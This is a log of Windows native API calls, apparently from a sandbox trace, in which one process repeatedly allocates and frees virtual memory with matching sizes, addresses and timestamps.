NtFreeVirtualMemory,0xffffffff#3368#667648#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#675840#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#671744#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#679936#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#675840#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#684032#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#679936#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#688128#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#684032#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#692224#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#688128#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#696320#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#692224#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#700416#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#696320#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#704512#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#700416#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#708608#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#704512#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#712704#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#708608#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#724992#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#712704#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#729088#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#724992#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#757760#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#729088#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#761856#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#757760#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#765952#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#761856#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#770048#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#765952#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#774144#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#770048#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#786432#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#774144#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#802816#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#786432#0x01610000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#819200#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#802816#0x02270000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#823296#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#819200#0x01610000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#827392#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#823296#0x02270000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#831488#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#827392#0x01610000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#835584#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#831488#0x02270000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#839680#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#835584#0x01610000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#843776#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#839680#0x02270000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#847872#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#843776#0x01610000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#851968#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#847872#0x02270000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#856064#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#851968#0x01610000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#860160#4096#0xffffffff#0#3368#0x02350000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#856064#0x02270000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#864256#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#860160#0x02350000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#868352#4096#0xffffffff#0#3368#0x02350000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#864256#0x02270000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#872448#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#868352#0x02350000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#876544#4096#0xffffffff#0#3368#0x02350000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#872448#0x02270000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#880640#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#876544#0x02350000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#884736#4096#0xffffffff#0#3368#0x02350000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#880640#0x02270000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#888832#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#884736#0x02350000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#892928#4096#0xffffffff#0#3368#0x02350000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#888832#0x02270000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#897024#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#892928#0x02350000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#901120#4096#0xffffffff#0#3368#0x02350000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#897024#0x02270000#32768,0,1542888075.171375
NtAllocateVirtualMemory,0#0#905216#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.171375
NtFreeVirtualMemory,0xffffffff#3368#901120#0x02350000#32768,0,1542888075.187375
NtAllocateVirtualMemory,0#0#909312#4096#0xffffffff#0#3368#0x02350000#4,0,1542888075.187375
NtFreeVirtualMemory,0xffffffff#3368#905216#0x02270000#32768,0,1542888075.187375
NtAllocateVirtualMemory,0#0#913408#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.187375
NtFreeVirtualMemory,0xffffffff#3368#909312#0x02350000#32768,0,1542888075.187375
NtAllocateVirtualMemory,0#0#917504#4096#0xffffffff#0#3368#0x02350000#4,0,1542888075.187375
NtFreeVirtualMemory,0xffffffff#3368#913408#0x02270000#32768,0,1542888075.187375
NtAllocateVirtualMemory,0#0#921600#4096#0xffffffff#0#3368#0x02430000#4,0,1542888075.187375
NtFreeVirtualMemory,0xffffffff#3368#917504#0x02350000#32768,0,1542888075.187375
NtAllocateVirtualMemory,0#0#925696#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.187375
NtFreeVirtualMemory,0xffffffff#3368#921600#0x02430000#32768,0,1542888075.187375
NtAllocateVirtualMemory,0#0#929792#4096#0xffffffff#0#3368#0x02360000#4,0,1542888075.187375
NtFreeVirtualMemory,0xffffffff#3368#925696#0x02270000#32768,0,1542888075.187375
NtAllocateVirtualMemory,0#0#933888#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.187375
NtFreeVirtualMemory,0xffffffff#3368#929792#0x02360000#32768,0,1542888075.187375
NtAllocateVirtualMemory,0#0#937984#4096#0xffffffff#0#3368#0x02360000#4,0,1542888075.187375
NtFreeVirtualMemory,0xffffffff#3368#933888#0x02270000#32768,0,1542888075.187375
NtAllocateVirtualMemory,0#0#942080#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.187375
NtFreeVirtualMemory,0xffffffff#3368#937984#0x02360000#32768,0,1542888075.187375
NtAllocateVirtualMemory,0#0#946176#4096#0xffffffff#0#3368#0x02360000#4,0,1542888075.187375
NtFreeVirtualMemory,0xffffffff#3368#942080#0x02270000#32768,0,1542888075.187375
NtAllocateVirtualMemory,0#0#950272#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.187375
NtFreeVirtualMemory,0xffffffff#3368#946176#0x02360000#32768,0,1542888075.187375
NtAllocateVirtualMemory,0#0#954368#4096#0xffffffff#0#3368#0x02360000#4,0,1542888075.187375
NtFreeVirtualMemory,0xffffffff#3368#950272#0x02270000#32768,0,1542888075.187375
NtAllocateVirtualMemory,0#0#958464#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.187375
NtFreeVirtualMemory,0xffffffff#3368#954368#0x02360000#32768,0,1542888075.187375
NtAllocateVirtualMemory,0#0#962560#4096#0xffffffff#0#3368#0x02360000#4,0,1542888075.187375
NtFreeVirtualMemory,0xffffffff#3368#958464#0x02270000#32768,0,1542888075.187375
NtAllocateVirtualMemory,0#0#966656#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.187375
NtFreeVirtualMemory,0xffffffff#3368#962560#0x02360000#32768,0,1542888075.187375
NtAllocateVirtualMemory,0#0#970752#4096#0xffffffff#0#3368#0x02360000#4,0,1542888075.187375
NtFreeVirtualMemory,0xffffffff#3368#966656#0x02270000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#974848#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#970752#0x02360000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#978944#4096#0xffffffff#0#3368#0x02360000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#974848#0x02270000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#983040#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#978944#0x02360000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#987136#4096#0xffffffff#0#3368#0x02360000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#983040#0x02270000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#991232#4096#0xffffffff#0#3368#0x02460000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#987136#0x02360000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#995328#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#991232#0x02460000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#999424#4096#0xffffffff#0#3368#0x02370000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#995328#0x02270000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#1003520#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#999424#0x02370000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#1007616#4096#0xffffffff#0#3368#0x02370000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#1003520#0x02270000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#1011712#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#1007616#0x02370000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#1015808#4096#0xffffffff#0#3368#0x02370000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#1011712#0x02270000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#1019904#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#1015808#0x02370000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#1024000#4096#0xffffffff#0#3368#0x02370000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#1019904#0x02270000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#1028096#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#1024000#0x02370000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#1032192#4096#0xffffffff#0#3368#0x02370000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#1028096#0x02270000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#1036288#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#1032192#0x02370000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#1040384#4096#0xffffffff#0#3368#0x02370000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#1036288#0x02270000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#1044480#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#1040384#0x02370000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#1048576#4096#0xffffffff#0#3368#0x02370000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#1044480#0x02270000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#1052672#4096#0xffffffff#0#3368#0x02470000#4,0,1542888075.203375
NtFreeVirtualMemory,0xffffffff#3368#1048576#0x02370000#32768,0,1542888075.203375
NtAllocateVirtualMemory,0#0#1056768#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1052672#0x02470000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1060864#4096#0xffffffff#0#3368#0x02380000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1056768#0x02270000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1064960#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1060864#0x02380000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1069056#4096#0xffffffff#0#3368#0x02380000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1064960#0x02270000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1077248#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1069056#0x02380000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1081344#4096#0xffffffff#0#3368#0x02380000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1077248#0x02270000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1085440#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1081344#0x02380000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1089536#4096#0xffffffff#0#3368#0x02380000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1085440#0x02270000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1093632#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1089536#0x02380000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1097728#4096#0xffffffff#0#3368#0x02380000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1093632#0x02270000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1101824#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1097728#0x02380000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1105920#4096#0xffffffff#0#3368#0x02380000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1101824#0x02270000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1110016#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1105920#0x02380000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1114112#4096#0xffffffff#0#3368#0x02380000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1110016#0x02270000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1118208#4096#0xffffffff#0#3368#0x02490000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1114112#0x02380000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1122304#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1118208#0x02490000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1126400#4096#0xffffffff#0#3368#0x02390000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1122304#0x02270000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1130496#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.218375
NtFreeVirtualMemory,0xffffffff#3368#1126400#0x02390000#32768,0,1542888075.218375
NtAllocateVirtualMemory,0#0#1134592#4096#0xffffffff#0#3368#0x02390000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1130496#0x02270000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1138688#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1134592#0x02390000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1142784#4096#0xffffffff#0#3368#0x02390000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1138688#0x02270000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1146880#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1142784#0x02390000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1150976#4096#0xffffffff#0#3368#0x02390000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1146880#0x02270000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1155072#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1150976#0x02390000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1159168#4096#0xffffffff#0#3368#0x02390000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1155072#0x02270000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1163264#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1159168#0x02390000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1167360#4096#0xffffffff#0#3368#0x02390000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1163264#0x02270000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1171456#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1167360#0x02390000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1175552#4096#0xffffffff#0#3368#0x02390000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1171456#0x02270000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1183744#4096#0xffffffff#0#3368#0x024b0000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1175552#0x02390000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1187840#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1183744#0x024b0000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1191936#4096#0xffffffff#0#3368#0x023a0000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1187840#0x02270000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1196032#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1191936#0x023a0000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1200128#4096#0xffffffff#0#3368#0x023a0000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1196032#0x02270000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1204224#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1200128#0x023a0000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1208320#4096#0xffffffff#0#3368#0x023a0000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1204224#0x02270000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1212416#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1208320#0x023a0000#32768,0,1542888075.234375
NtAllocateVirtualMemory,0#0#1216512#4096#0xffffffff#0#3368#0x023a0000#4,0,1542888075.234375
NtFreeVirtualMemory,0xffffffff#3368#1212416#0x02270000#32768,0,1542888075.250375
NtAllocateVirtualMemory,0#0#1220608#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.250375
NtFreeVirtualMemory,0xffffffff#3368#1216512#0x023a0000#32768,0,1542888075.250375
NtAllocateVirtualMemory,0#0#1228800#4096#0xffffffff#0#3368#0x023a0000#4,0,1542888075.250375
NtFreeVirtualMemory,0xffffffff#3368#1220608#0x02270000#32768,0,1542888075.250375
NtAllocateVirtualMemory,0#0#1232896#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.250375
NtFreeVirtualMemory,0xffffffff#3368#1228800#0x023a0000#32768,0,1542888075.250375
NtAllocateVirtualMemory,0#0#1236992#4096#0xffffffff#0#3368#0x023a0000#4,0,1542888075.250375
NtFreeVirtualMemory,0xffffffff#3368#1232896#0x02270000#32768,0,1542888075.250375
NtAllocateVirtualMemory,0#0#1241088#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.250375
NtFreeVirtualMemory,0xffffffff#3368#1236992#0x023a0000#32768,0,1542888075.250375
NtAllocateVirtualMemory,0#0#1245184#4096#0xffffffff#0#3368#0x023a0000#4,0,1542888075.250375
NtFreeVirtualMemory,0xffffffff#3368#1241088#0x02270000#32768,0,1542888075.250375
NtAllocateVirtualMemory,0#0#1249280#4096#0xffffffff#0#3368#0x024d0000#4,0,1542888075.250375
NtFreeVirtualMemory,0xffffffff#3368#1245184#0x023a0000#32768,0,1542888075.250375
NtAllocateVirtualMemory,0#0#1253376#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.250375
NtFreeVirtualMemory,0xffffffff#3368#1249280#0x024d0000#32768,0,1542888075.250375
NtAllocateVirtualMemory,0#0#1257472#4096#0xffffffff#0#3368#0x023b0000#4,0,1542888075.250375
NtFreeVirtualMemory,0xffffffff#3368#1253376#0x02270000#32768,0,1542888075.250375
NtAllocateVirtualMemory,0#0#1261568#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.250375
NtFreeVirtualMemory,0xffffffff#3368#1257472#0x023b0000#32768,0,1542888075.250375
NtAllocateVirtualMemory,0#0#1265664#4096#0xffffffff#0#3368#0x023b0000#4,0,1542888075.250375
NtFreeVirtualMemory,0xffffffff#3368#1261568#0x02270000#32768,0,1542888075.250375
NtAllocateVirtualMemory,0#0#1269760#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.250375
NtFreeVirtualMemory,0xffffffff#3368#1265664#0x023b0000#32768,0,1542888075.250375
NtAllocateVirtualMemory,0#0#1273856#4096#0xffffffff#0#3368#0x023b0000#4,0,1542888075.250375
NtFreeVirtualMemory,0xffffffff#3368#1269760#0x02270000#32768,0,1542888075.250375
NtAllocateVirtualMemory,0#0#1277952#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.250375
NtFreeVirtualMemory,0xffffffff#3368#1273856#0x023b0000#32768,0,1542888075.250375
NtAllocateVirtualMemory,0#0#1282048#4096#0xffffffff#0#3368#0x023b0000#4,0,1542888075.250375
NtFreeVirtualMemory,0xffffffff#3368#1277952#0x02270000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1286144#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1282048#0x023b0000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1290240#4096#0xffffffff#0#3368#0x023b0000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1286144#0x02270000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1294336#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1290240#0x023b0000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1298432#4096#0xffffffff#0#3368#0x023b0000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1294336#0x02270000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1302528#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1298432#0x023b0000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1306624#4096#0xffffffff#0#3368#0x023b0000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1302528#0x02270000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1310720#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1306624#0x023b0000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1314816#4096#0xffffffff#0#3368#0x023b0000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1310720#0x02270000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1318912#4096#0xffffffff#0#3368#0x02500000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1314816#0x023b0000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1323008#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1318912#0x02500000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1327104#4096#0xffffffff#0#3368#0x023c0000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1323008#0x02270000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1331200#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1327104#0x023c0000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1343488#4096#0xffffffff#0#3368#0x023c0000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1331200#0x02270000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1347584#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1343488#0x023c0000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1355776#4096#0xffffffff#0#3368#0x023c0000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1347584#0x02270000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1359872#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1355776#0x023c0000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1363968#4096#0xffffffff#0#3368#0x023c0000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1359872#0x02270000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1372160#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.265375
NtFreeVirtualMemory,0xffffffff#3368#1363968#0x023c0000#32768,0,1542888075.265375
NtAllocateVirtualMemory,0#0#1376256#4096#0xffffffff#0#3368#0x023c0000#4,0,1542888075.265375
